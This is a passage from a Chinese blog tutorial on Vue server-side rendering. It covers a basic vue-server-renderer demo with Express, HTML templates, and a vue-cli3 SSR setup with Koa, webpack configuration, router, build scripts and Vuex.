<p>（1）开发条件所限。浏览器特定的代码，只能在某些生命周期钩子函数(lifecycle hook)中使用；一些外部扩展库(external library)可能需要特殊处理，才能在服务器渲染应用程序中运行。<br>（2）涉及构建设置和部署的更多要求。与可以部署在任何静态文件服务器上的完全静态单页面应用程序(SPA)不同，服务器渲染应用程序，需要处于 Node.js server 运行环境。<br>（3）更多的服务器端负载。在 Node.js 中渲染完整的应用程序，显然会比仅仅提供静态文件的 server 更加大量占用 CPU 资源(CPU-intensive - CPU 密集)，因此如果你预料在高流量环境(high traffic)下使用，请准备相应的服务器负载，并明智地采用缓存策略。</p>
</blockquote>
<h3 id="实现一个简单的SSR"><a href="#实现一个简单的SSR" class="headerlink" title="实现一个简单的SSR"></a>实现一个简单的SSR</h3><ul>
<li>创建一个空项目 mkdir vue-init &amp;&amp; cd vue-init</li>
<li>npm init 初始化</li>
<li><p>安装依赖  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install vue vue-server-renderer --save</span><br><span class="line">/*</span><br><span class="line">推荐使用 Node.js 版本 6+。</span><br><span class="line">vue-server-renderer 和 vue 必须匹配版本。</span><br><span class="line">vue-server-renderer 依赖一些 Node.js 原生模块，因此只能在 Node.js 中使用。我们可能会提供一个更简单的构建，可以在将来在其「JavaScript 运行时(runtime)」运行</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建index.js代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Vue = <span class="built_in">require</span>(<span class="string">'vue'</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  template: <span class="string">`&lt;div&gt;Hello World&lt;/div&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 第 2 步：创建一个 renderer</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">'vue-server-renderer'</span>).createRenderer()</span><br><span class="line"><span class="comment">// 第 3 步：将 Vue 实例渲染为 HTML</span></span><br><span class="line">renderer.renderToString(app, (err, html) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">throw</span> err</span><br><span class="line">    <span class="built_in">console</span>.log(html)</span><br><span class="line"><span class="comment">// =&gt; &lt;div data-server-rendered="true"&gt;Hello World&lt;/div&gt;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行node index.js 可以看到控制台的输出<br><img src="/images/ssr3.png" alt="My Pic"></p>
<blockquote>
<p>我们在将这个结果通过一个服务返给浏览器不就完成服务端渲染了么？</p>
</blockquote>
</li>
<li><p>安装服务器  npm install express –save</p>
</li>
<li><p>创建app.js 代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Vue = <span class="built_in">require</span>(<span class="string">'vue'</span>)</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">'express'</span>)()</span><br><span class="line"><span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">'vue-server-renderer'</span>).createRenderer()</span><br><span class="line">server.get(<span class="string">'*'</span>, (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    url: req.url</span><br><span class="line">  &#125;,</span><br><span class="line">  template: <span class="string">`&lt;div&gt;访问的 URL 是： &#123;&#123; url &#125;&#125;&lt;/div&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line">renderer.renderToString(app, (err, html) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">  res.status(<span class="number">500</span>).end(<span class="string">'Internal Server Error'</span>)</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res.end(<span class="string">`</span></span><br><span class="line"><span class="string">  &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">  &lt;html lang="en"&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;&lt;title&gt;Hello&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;<span class="subst">$&#123;html&#125;</span>&lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到已经实现了服务端渲染<br><img src="/images/ssr4.png" alt="My Pic"></p>
</li>
<li><p>我们也可以使用一个页面模板（当你在渲染 Vue 应用程序时，renderer 只从应用程序生成 HTML 标记 (markup)。在这个示例中，我们必须用一个额外的 HTML 页面包裹容器，来包裹生成的 HTML 标记。）创建一个index.template.html 代码如下(注释的地方就是html注入的标记)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meat</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--vue-ssr-outlet--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改app.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">'vue-server-renderer'</span>).createRenderer(&#123;</span><br><span class="line">  template: <span class="built_in">require</span>(<span class="string">'fs'</span>).readFileSync(<span class="string">'./index.template.html'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//***</span></span><br><span class="line">renderer.renderToString(app, (err, html) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">  res.status(<span class="number">500</span>).end(<span class="string">'Internal Server Error'</span>)</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html;charset=utf-8'</span>&#125;);</span><br><span class="line">  res.end(html)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果和上面的相同</p>
</li>
<li>除此之外，它还支持模板插值操作，修改文件index.template.html，代码如下：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用双花括号(double-mustache)进行 HTML 转义插值(HTML-escaped interpolation) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用三花括号(triple-mustache)进行 HTML 不转义插值(non-HTML-escaped interpolation) --&gt;</span></span><br><span class="line">  &#123;&#123;&#123; meta &#125;&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--vue-ssr-outlet--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>修改文件index.js  代码如下<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Vue = <span class="built_in">require</span>(<span class="string">'vue'</span>)</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">'express'</span>)()</span><br><span class="line"><span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">'vue-server-renderer'</span>).createRenderer()</span><br><span class="line">server.get(<span class="string">'*'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    url: req.url</span><br><span class="line">  &#125;,</span><br><span class="line">    template: <span class="string">`&lt;div&gt;访问的 URL 是： &#123;&#123; url &#125;&#125;&lt;/div&gt;`</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">'vue-server-renderer'</span>).createRenderer(&#123;</span><br><span class="line">    template: <span class="built_in">require</span>(<span class="string">'fs'</span>).readFileSync(<span class="string">'./index.template.html'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> context = &#123;</span><br><span class="line">    title: <span class="string">'hello vuessr'</span>,</span><br><span class="line">    meta: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//***</span></span><br><span class="line">  renderer.renderToString(app, context, (err, html) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    res.status(<span class="number">500</span>).end(<span class="string">'Internal Server Error'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html;charset=utf-8'</span>&#125;);</span><br><span class="line">    res.end(html)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">8080</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/ssr5.png" alt="My Pic"></p>
<blockquote>
<p>至此已经实现了一个简单的服务端渲染的demo。但是要使用在实际的项目中还需要解决很多问题。</p>
</blockquote>
<h3 id="vue-cli3中使用ssr"><a href="#vue-cli3中使用ssr" class="headerlink" title="vue-cli3中使用ssr"></a>vue-cli3中使用ssr</h3><ol>
<li><p>创建一个vue-cli3项目</p>
<blockquote>
<p>vue create myssr</p>
</blockquote>
</li>
<li><p>进入文件夹，运行 cnpm run serve；启动项目</p>
</li>
<li>安装以下的依赖</li>
</ol>
<blockquote>
<p>安装 vue-server-renderer<br>安装 lodash.merge(lodash中的_.merge方法 合并对象)<br>安装 webpack-node-externals（所有的node模块的包 不会被打包）<br>安装 cross-env（设置环境变量）</p>
</blockquote>
<p>4.在服务器中集成</p>
<blockquote>
<p>在项目根目录下新建一个server.js<br>安装koa2<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install koa koa-static --save</span><br></pre></td></tr></table></figure></p>
<p>server.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">"koa"</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">const</span> koaStatic = <span class="built_in">require</span>(<span class="string">'koa-static'</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> resolve = <span class="function"><span class="params">file</span> =&gt;</span> path.resolve(__dirname, file);</span><br><span class="line"><span class="comment">// 开放dist目录</span></span><br><span class="line">app.use(koaStatic(resolve(<span class="string">'./dist'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第 2 步：获得一个createBundleRenderer</span></span><br><span class="line"><span class="keyword">const</span> &#123; createBundleRenderer &#125; = <span class="built_in">require</span>(<span class="string">"vue-server-renderer"</span>);</span><br><span class="line"><span class="keyword">const</span> bundle = <span class="built_in">require</span>(<span class="string">"./dist/vue-ssr-server-bundle.json"</span>);</span><br><span class="line"><span class="keyword">const</span> clientManifest = <span class="built_in">require</span>(<span class="string">"./dist/vue-ssr-client-manifest.json"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> renderer = createBundleRenderer(bundle, &#123;</span><br><span class="line">  runInNewContext: <span class="literal">false</span>,</span><br><span class="line">  template: fs.readFileSync(resolve(<span class="string">"./src/index.template.html"</span>), <span class="string">"utf-8"</span>),</span><br><span class="line">  clientManifest: clientManifest</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderToString</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    renderer.renderToString(context, (err, html) =&gt; &#123;</span><br><span class="line">      err ? reject(err) : resolve(html);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第 3 步：添加一个中间件来处理所有请求</span></span><br><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> context = &#123;</span><br><span class="line">    title: <span class="string">"ssr test"</span>,</span><br><span class="line">    url: ctx.url</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 将 context 数据渲染为 HTML</span></span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> renderToString(context);</span><br><span class="line">  ctx.body = html;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line">app.listen(port, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`server started at localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ol>
<li>改造前端配置，以支持SSR<blockquote>
<p>在src下新增index.template.html文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--vue-ssr-outlet--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<blockquote>
<p>在src目录下新建两个文件，一个entry-client.js 仅运行于浏览器 一个entry-server.js 仅运行于服务器<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* entry-client */</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'./main'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端特定引导逻辑……</span></span><br><span class="line"><span class="keyword">const</span> &#123; app &#125; = createApp()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里假定 App.vue 模板中根元素具有 `id="app"`</span></span><br><span class="line">app.$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* entry-server */</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">"./main"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> context =&gt; &#123;</span><br><span class="line">  <span class="comment">// 因为有可能会是异步路由钩子函数或组件，所以我们将返回一个 Promise，</span></span><br><span class="line">  <span class="comment">// 以便服务器能够等待所有的内容在渲染前，</span></span><br><span class="line">  <span class="comment">// 就已经准备就绪。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; app, router &#125; = createApp();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器端 router 的位置</span></span><br><span class="line">    router.push(context.url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等到 router 将可能的异步组件和钩子函数解析完</span></span><br><span class="line">    router.onReady(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> matchedComponents = router.getMatchedComponents();</span><br><span class="line">      <span class="comment">// 匹配不到的路由，执行 reject 函数，并返回 404</span></span><br><span class="line">      <span class="keyword">if</span> (!matchedComponents.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(&#123;</span><br><span class="line">          code: <span class="number">404</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Promise 应该 resolve 应用程序实例，以便它可以渲染</span></span><br><span class="line">      resolve(app);</span><br><span class="line">    &#125;, reject);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>修改main.js<br>main.js 是我们应用程序的「通用 entry」。在纯客户端应用程序中，我们将在此文件中创建根 Vue 实例，并直接挂载到 DOM。但是，对于服务器端渲染(SSR)，责任转移到纯客户端 entry 文件。app.js 简单地使用 export 导出一个 createApp 函数：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line"><span class="keyword">import</span> &#123; createRouter &#125; <span class="keyword">from</span> <span class="string">"./router"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出一个工厂函数，用于创建新的</span></span><br><span class="line"><span class="comment">// 应用程序、router 和 store 实例</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createApp</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> router = createRouter();</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    router,</span><br><span class="line">    <span class="comment">// 根实例简单的渲染应用程序组件。</span></span><br><span class="line">    render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> &#123; app,router &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>修改router.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">'./views/Home.vue'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createRouter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">    mode: <span class="string">'history'</span>, <span class="comment">//一定要是history模式</span></span><br><span class="line">    routes: [</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">'/'</span>,</span><br><span class="line">        name: <span class="string">'home'</span>,</span><br><span class="line">        component: Home</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">'/about'</span>,</span><br><span class="line">        name: <span class="string">'about'</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: "about" */</span> <span class="string">'./views/About.vue'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>6.添加和修改相应的webpack配置，vue-cli3在vue.config.js中配置</p>
<blockquote>
<p>添加vue.config.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> VueSSRServerPlugin = <span class="built_in">require</span>(<span class="string">"vue-server-renderer/server-plugin"</span>);</span><br><span class="line"><span class="keyword">const</span> VueSSRClientPlugin = <span class="built_in">require</span>(<span class="string">"vue-server-renderer/client-plugin"</span>);</span><br><span class="line"><span class="keyword">const</span> nodeExternals = <span class="built_in">require</span>(<span class="string">"webpack-node-externals"</span>);</span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">"lodash.merge"</span>);</span><br><span class="line"><span class="keyword">const</span> TARGET_NODE = process.env.WEBPACK_TARGET === <span class="string">"node"</span>;</span><br><span class="line"><span class="keyword">const</span> target = TARGET_NODE ? <span class="string">"server"</span> : <span class="string">"client"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  css: &#123;</span><br><span class="line">    extract: process.env.NODE_ENV === <span class="string">'production'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  configureWebpack: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;</span><br><span class="line">    <span class="comment">// 将 entry 指向应用程序的 server / client 文件</span></span><br><span class="line">    entry: <span class="string">`./src/entry-<span class="subst">$&#123;target&#125;</span>.js`</span>,</span><br><span class="line">    <span class="comment">// 对 bundle renderer 提供 source map 支持</span></span><br><span class="line">    devtool: <span class="string">'source-map'</span>,</span><br><span class="line">    target: TARGET_NODE ? <span class="string">"node"</span> : <span class="string">"web"</span>,</span><br><span class="line">    node: TARGET_NODE ? <span class="literal">undefined</span> : <span class="literal">false</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">      libraryTarget: TARGET_NODE ? <span class="string">"commonjs2"</span> : <span class="literal">undefined</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// https://webpack.js.org/configuration/externals/#function</span></span><br><span class="line">    <span class="comment">// https://github.com/liady/webpack-node-externals</span></span><br><span class="line">    <span class="comment">// 外置化应用程序依赖模块。可以使服务器构建速度更快，</span></span><br><span class="line">    <span class="comment">// 并生成较小的 bundle 文件。</span></span><br><span class="line">    externals: TARGET_NODE</span><br><span class="line">      ? nodeExternals(&#123;</span><br><span class="line">          <span class="comment">// 不要外置化 webpack 需要处理的依赖模块。</span></span><br><span class="line">          <span class="comment">// 你可以在这里添加更多的文件类型。例如，未处理 *.vue 原始文件，</span></span><br><span class="line">          <span class="comment">// 你还应该将修改 `global`（例如 polyfill）的依赖模块列入白名单</span></span><br><span class="line">          whitelist: [<span class="regexp">/\.css$/</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">      : <span class="literal">undefined</span>,</span><br><span class="line">    optimization: &#123;</span><br><span class="line">          splitChunks: <span class="literal">undefined</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [TARGET_NODE ? <span class="keyword">new</span> VueSSRServerPlugin() : <span class="keyword">new</span> VueSSRClientPlugin()]</span><br><span class="line">  &#125;),</span><br><span class="line">  chainWebpack: <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    config.module</span><br><span class="line">      .rule(<span class="string">"vue"</span>)</span><br><span class="line">      .use(<span class="string">"vue-loader"</span>)</span><br><span class="line">      .tap(<span class="function"><span class="params">options</span> =&gt;</span> &#123;</span><br><span class="line">        merge(options, &#123;</span><br><span class="line">          optimizeSSR: <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// fix ssr hot update bug</span></span><br><span class="line">    <span class="keyword">if</span> (TARGET_NODE) &#123;</span><br><span class="line">      config.plugins.delete(<span class="string">"hmr"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ol>
<li><p>修改package，新增三个脚本来进行分别的打包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;build:client&quot;: &quot;vue-cli-service build&quot;,</span><br><span class="line">&quot;build:server&quot;: &quot;cross-env WEBPACK_TARGET=node vue-cli-service build --mode server&quot;,</span><br><span class="line">&quot;build:win&quot;: &quot;npm run build:server &amp;&amp; move dist\\vue-ssr-server-bundle.json bundle &amp;&amp; npm run build:client &amp;&amp; move bundle dist\\vue-ssr-server-bundle.json&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行命令</p>
<blockquote>
<p>npm run build:win 生成打包之后的文件<br><img src="/images/ssr6.png" alt="My Pic"></p>
</blockquote>
</li>
<li><p>启动服务端</p>
<blockquote>
<p>node server.js<br>访问 localhost:3000，可以看到页面的数据都是又服务端渲染完成后返回的。到这一步已经基本算完成了SSR的构建了。<br>如果没成功可以删除dist中的html试试 避免直接访问到了该html文件。<br>解过实现了ssr<br><img src="/images/ssr7.png" alt="My Pic"></p>
</blockquote>
</li>
</ol>
<p>10.添加Vuex</p>
<blockquote>
<p>修改store.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createStore</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        age: <span class="number">12</span>,</span><br><span class="line">        name: <span class="string">'sxy'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>修改main.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">"./App.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createRouter &#125; <span class="keyword">from</span> <span class="string">"@/router"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">"@/store"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createApp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> router = createRouter();</span><br><span class="line">  <span class="keyword">const</span> store = createStore()  <span class="comment">// +</span></span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    router,</span><br><span class="line">    store,      <span class="comment">// +</span></span><br><span class="line">    render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123; app, router,store &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
